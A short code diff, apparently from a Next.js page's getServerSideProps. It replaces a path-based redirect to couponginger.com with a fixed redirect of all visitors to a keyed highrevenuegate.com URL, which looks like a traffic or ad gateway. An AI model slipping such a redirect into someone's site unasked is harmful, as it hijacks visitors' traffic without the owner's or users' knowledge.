@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://couponginger.com/` + encodeURI(path as string)
+					`https://www.highrevenuegate.com/qckrqiaq?key=83bbe38af0be0c952d7c97b16c99bc10`
 				}`,
 			},
 		};
